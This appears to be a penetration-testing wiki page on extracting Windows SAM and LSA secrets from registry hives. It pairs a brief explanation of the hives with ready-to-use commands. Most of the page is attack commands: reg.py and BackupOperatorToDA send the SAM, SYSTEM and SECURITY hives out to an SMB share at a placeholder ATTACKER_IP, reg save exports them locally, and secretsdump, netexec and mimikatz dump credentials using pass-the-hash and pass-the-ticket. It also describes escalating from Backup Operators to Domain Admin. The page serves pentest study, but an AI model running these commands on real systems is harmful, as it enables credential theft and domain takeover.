## Theory
In Windows environments, passwords are stored in a hashed format in registry hives like SAM (Security Account Manager) and SECURITY.

| **Hive**   | **Details**                                                                 | **Format or credential material**                                                                                           |
|------------|------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------|
| SAM        | stores locally cached credentials (referred to as SAM secrets)              | LM or NT hashes                                                                                                              |
| SECURITY   | stores domain cached credentials (referred to as LSA secrets)               | Plaintext passwords, LM or NT hashes, Kerberos keys (DES, AES), Domain Cached Credentials (DCC1 and DCC2), Security Questions (`L$`, `SQSA`, `<SID>`) |
| SYSTEM     | contains enough info to decrypt SAM secrets and LSA secrets                 | N/A                                                                                                                          |

SAM and LSA secrets can be dumped either locally or remotely from the mounted registry hives. These secrets can also be extracted offline from the exported hives. Once the secrets are extracted, they can be used for various attacks, depending on the credential format.
## Exfiltration
=== "UNIX-like"
    Impacket's [reg.py](https://github.com/fortra/impacket/blob/master/examples/reg.py) (Python) script can also be used to do the same operation remotely for a UNIX-like machine. For instance, this can be used to easily escalate from a Backup Operator member to a Domain Admin by dumping a Domain Controller's secrets and use them for a DCSync.
    ```bash
    # start an SMB share
    smbserver.py -smb2support "someshare" "./"

    # save each hive manually
    reg.py "domain"/"user":"password"@"target" save -keyName 'HKLM\SAM' -o '\\ATTACKER_IPs\someshare'
    reg.py "domain"/"user":"password"@"target" save -keyName 'HKLM\SYSTEM' -o '\\ATTACKER_IP\someshare'
    reg.py "domain"/"user":"password"@"target" save -keyName 'HKLM\SECURITY' -o '\\ATTACKER_IP\someshare'

    # backup all SAM, SYSTEM and SECURITY hives at once
    reg.py "domain"/"user":"password"@"target" backup -o '\\ATTACKER_IP\someshare'
    ```
=== "Live Windows"
    When the Windows operating system is running, the hives are in use and mounted. The command-line tool named `reg` can be used to export them.
    ```bash
    reg save HKLM\SAM "C:\Windows\Temp\sam.save"
    reg save HKLM\SECURITY "C:\Windows\Temp\security.save"
    reg save HKLM\SYSTEM "C:\Windows\Temp\system.save"
    ```
    !!! note 
        If we compromise an account member of the group Backup Operators, we can become the Domain Admin without RDP or WinRM on the Domain Controller.
        This operation can be conducted remotely with [BackupOperatoToDA](https://github.com/mpgn/BackupOperatorToDA) (C++)
        ```bash
        BackupOperatorToDA.exe -d "domain" -u "user" -p "password" -t "target" -o "\\ATTACKER_IP\someshare"
        ```

        Alternatively, from a live Windows machine, the hive files can also be exfiltrated using Volume Shadow Copy like demonstrated for an NTDS export.
## Secrets dumping
=== "secretsdump"
    Impacket's [secretsdump](https://wadcoms.github.io/wadcoms/Impacket-SecretsDump/) (Python) can be used to dump SAM and LSA secrets, either remotely, or from local files. For remote dumping, several authentication methods can be used like pass-the-hash (LM/NTLM), or pass-the-ticket (Kerberos).
    ```bash
    # Remote dumping of SAM & LSA secrets
    secretsdump.py 'DOMAIN/USER:PASSWORD@TARGET'

    # Remote dumping of SAM & LSA secrets (pass-the-hash)
    secretsdump.py -hashes 'LMhash:NThash' 'DOMAIN/USER@TARGET'

    # Remote dumping of SAM & LSA secrets (pass-the-ticket)
    secretsdump.py -k 'DOMAIN/USER@TARGET'

    # Offline dumping of LSA secrets from exported hives
    secretsdump.py -security '/path/to/security.save' -system '/path/to/system.save' LOCAL

    # Offline dumping of SAM secrets from exported hives
    secretsdump.py -sam '/path/to/sam.save' -system '/path/to/system.save' LOCAL

    # Offline dumping of SAM & LSA secrets from exported hives
    secretsdump.py -sam '/path/to/sam.save' -security '/path/to/security.save' -system '/path/to/system.save' LOCAL
    ```
=== "netexec"
    [NetExec](https://github.com/Pennyw0rth/NetExec) (Python) can be used to remotely dump SAM and LSA secrets, on multiple hosts. It offers several authentication methods like pass-the-hash (NTLM), or pass-the-ticket (Kerberos)
    ```
    # Remote dumping of SAM/LSA secrets
    netexec smb $TARGETS -d $DOMAIN -u $USER -p $PASSWORD --sam/--lsa

    # Remote dumping of SAM/LSA secrets (local user authentication)
    netexec smb $TARGETS --local-auth -u $USER -p $PASSWORD --sam/--lsa

    # Remote dumping of SAM/LSA secrets (pass-the-hash)
    netexec smb $TARGETS -d $DOMAIN -u $USER -H $NThash --sam/--lsa

    # Remote dumping of SAM/LSA secrets (pass-the-ticket)
    netexec smb $TARGETS --kerberos --sam/--lsa
    ```
=== "mimikatz"
    Mimikatz can be used locally with `lsadump::sam` and `lsadump::secrets` to extract credentials from `SAM` and `SECURITY` registry hives (and `SYSTEM` for the encryption keys), or offline with hive dumps.
    ```bash
    # Local dumping of SAM secrets on the target
    lsadump::sam

    # Offline dumping of SAM secrets from exported hives
    lsadump::sam /sam:'C:\path\to\sam.save' /system:'C:\path\to\system.save'

    # Local dumping of LSA secrets on the target
    lsadump::secrets

    # Offline dumping LSA secrets from exported hives
    lsadump::secrets /security:'C:\path\to\security.save' /system:'C:\path\to\system.save'
    ```